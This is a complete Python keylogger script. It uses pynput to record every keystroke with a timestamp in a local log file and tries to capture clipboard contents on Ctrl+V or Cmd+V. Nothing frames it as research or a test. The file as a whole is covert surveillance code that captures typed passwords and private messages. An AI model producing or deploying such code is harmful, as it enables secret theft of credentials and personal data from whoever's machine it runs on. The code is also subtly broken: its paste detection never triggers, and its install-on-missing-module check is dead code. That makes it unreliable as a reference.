from pynput import keyboard
from datetime import datetime
import os
import pyperclip  # Clipboard handling

log_file = "key_log.txt"

def write_log(data):
    with open(log_file, "a") as f:
        f.write(data)

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        # Handle regular character keys
        log_entry = f"[{timestamp}] Key: {key.char}\n"
    except AttributeError:
        # Handle special keys
        log_entry = f"[{timestamp}] Special Key: [{key.name}]\n"
        
        # Detect paste (Ctrl+V or Command+V on macOS)
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            on_press.ctrl_pressed = True
        elif key == keyboard.Key.cmd:
            on_press.cmd_pressed = True
        elif key.name == "v" and (getattr(on_press, 'ctrl_pressed', False) or getattr(on_press, 'cmd_pressed', False)):
            try:
                pasted_data = pyperclip.paste()
                log_entry += f"[{timestamp}] Clipboard Paste: {pasted_data}\n"
            except Exception as e:
                log_entry += f"[{timestamp}] Clipboard access error: {e}\n"

    write_log(log_entry)

def on_release(key):
    # Reset paste detection keys
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        on_press.ctrl_pressed = False
    elif key == keyboard.Key.cmd:
        on_press.cmd_pressed = False

def main():
    # Initialize flag variables
    on_press.ctrl_pressed = False
    on_press.cmd_pressed = False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    # Check if clipboard module is available
    try:
        import pyperclip
    except ImportError:
        print("pyperclip module not found. Installing...")
        os.system("pip install pyperclip")

    main()
    
